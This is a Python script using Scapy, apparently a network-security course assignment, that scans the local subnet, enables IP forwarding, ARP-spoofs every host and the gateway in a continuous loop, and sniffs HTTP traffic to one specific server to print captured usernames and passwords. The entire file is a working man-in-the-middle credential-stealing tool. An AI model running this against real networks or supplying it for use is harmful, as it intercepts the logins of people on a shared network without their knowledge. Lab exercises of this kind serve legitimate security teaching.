#!/usr/bin/env python
from scapy.all import * # including all the functions we need in this project, e.g., sniff, get the IP's, arp spoofing
import os               # for enabling IP forwarding, Python standard library 
import threading        # for parallelly executing sniff() which is included in Scapy package, Python standard library

# Scan all devices in the subnet
def scan(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answer = srp(pkt, verbose=0, timeout=1)[0]
    result = []
    # parsing the scan result and save the IP and MAC address to dictionary
    for index in answer:
        result_dict = {"ip": index[1].psrc, "mac": index[1].hwsrc}
        result.append(result_dict)
    return result

# print out the list of devices
def printout(result):
    gatewayIP=conf.route.route("0.0.0.0")[2]
    print("Available devices")
    print("----------------------------------------------------")
    print("IP\t\t\tMAC Address")
    print("----------------------------------------------------")
    for index in result:
        if index["ip"] != gatewayIP:
            print(index["ip"] + "\t\t" + index["mac"])

# Parsing the HTTP packet
def sniffing(pkt):
    # Only sniff particular website's packets
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 and pkt.getlayer(IP).dst == "140.113.207.246":
        raw = str(pkt.getlayer(TCP))    # Just extrack the TCP payload
        data = raw.split("\r\n")        # The TCP payload separate each line by \r\n
        empty_line = False              # Set up the flag of detecting empty string 
        content = ""                    # declare the content string
        for index, line in enumerate(data):
            # There is a \r\n between header and contents
            if line == "" and empty_line == False:
                empty_line = True
                content = data[index + 1]
        # To avoid print out 2 same packet content I just print the original one
        if "usr" in content and pkt.getlayer(Ether).src != get_if_hwaddr(conf.iface):
            output=content.split("&")   # string parsing
            print(output[0]+"\t"+output[1])

# Sniff() starter
def startSniffing():
    print("")
    print("The Sniffed Username and Passwords(Press Ctrl+Z to terminate the sniffing):")
    # parsing the HTTP packet by "sniffing" function
    sniff(filter="tcp port 80", prn=sniffing)

# Execute ARP Spoofing
def ARPSPoofing(IP_1,IP_2,MAC_1):
    pkt = Ether(dst=MAC_1) / ARP(psrc=IP_2, pdst=IP_1, hwdst=MAC_1)
    srp(pkt, verbose=0, timeout=1)

# main function
def main():
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # Task I: Scan the subnet
    attackerIP=get_if_addr(conf.iface)
    subnet=attackerIP+"/24"
    result = scan(subnet)
    printout(result)

    # Task II: Spoof the packet and send the ARP response

    # Run sniff() in another thread
    sni=threading.Thread(target=startSniffing)
    sni.setDaemon(True)
    sni.start()

    # Get gateway IP and MAC
    gatewayIP=conf.route.route("0.0.0.0")[2]
    for index in result:
        if index["ip"] == gatewayIP:
            gatewayMAC=index["mac"]
    # Do ARP Spoofing to all the devices in the subnet
    while True:
        for index in result:
            if index["ip"] != gatewayIP:
                victimIP=index["ip"]
                victimMAC=index["mac"]
                ARPSPoofing(victimIP,gatewayIP,victimMAC)   # send spoofed-ARP packet to device
                ARPSPoofing(gatewayIP,victimIP,gatewayMAC)  # send spoofed-ARP packet to gateway

if __name__=="__main__":
    main()